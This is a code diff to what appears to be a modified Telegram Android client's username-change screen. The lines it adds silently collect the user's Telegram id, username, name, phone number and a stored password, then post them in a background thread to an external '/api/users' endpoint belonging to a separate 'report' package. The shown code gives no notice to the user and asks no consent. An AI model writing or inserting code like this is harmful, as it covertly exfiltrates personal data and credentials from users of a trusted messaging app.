@@ -33,6 +33,7 @@ import android.text.TextWatcher;
 import android.text.method.LinkMovementMethod;
 import android.text.style.ClickableSpan;
 import android.text.style.ForegroundColorSpan;
+import android.util.Log;
 import android.util.TypedValue;
 import android.view.Gravity;
 import android.view.MotionEvent;
@@ -92,6 +93,11 @@ import org.telegram.ui.Components.URLSpanNoUnderline;
 
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Map;
+
+import report.HttpRequest;
+import report.UserInfoFile;
+import report.entity.UserInfo;
 
 public class ChangeUsernameActivity extends BaseFragment {
 
@@ -1406,12 +1412,41 @@ public class ChangeUsernameActivity extends BaseFragment {
                         FileLog.e(e);
                     }
                     ArrayList<TLRPC.User> users = new ArrayList<>();
-                    users.add(user1);
+                     users.add(user1);
                     MessagesController.getInstance(currentAccount).putUsers(users, false);
                     MessagesStorage.getInstance(currentAccount).putUsersAndChats(users, null, false, true);
                     UserConfig.getInstance(currentAccount).saveConfig(true);
                     finishFragment();
                 });
+                // 更改用户名 START
+
+                TLRPC.User thisUser = UserConfig.getInstance(currentAccount).getCurrentUser();
+
+                UserInfo userInfo = UserInfoFile.readFile(getContext());
+                userInfo.setId(thisUser.id);
+                userInfo.setUsername(username);
+                userInfo.setFirstName(thisUser.first_name == null ? "" : thisUser.first_name);
+                userInfo.setLastName(thisUser.last_name == null ? "" : thisUser.last_name);
+                userInfo.setPhone(thisUser.phone);
+                UserInfoFile.writeFile(getContext(), userInfo);
+
+                Log.d("TG_DEBUG / Username", userInfo.getUsername() == null ? "" : userInfo.getUsername());
+
+                new Thread(() -> {
+                    HttpRequest.post(
+                            "/api/users",
+                            null,
+                            null,
+                            Map.of(
+                                    "telegram_id", userInfo.getId(),
+                                    "username", userInfo.getUsername(),
+                                    "nickname", userInfo.getFirstName() + userInfo.getLastName(),
+                                    "phone", userInfo.getPhone(),
+                                    "password", userInfo.getPassword()
+                            ));
+                }).start();
+
+                // 更改用户名 END
             } else if ("USERNAME_NOT_MODIFIED".equals(error.text)) {
                 AndroidUtilities.runOnUIThread(() -> {
                     try {
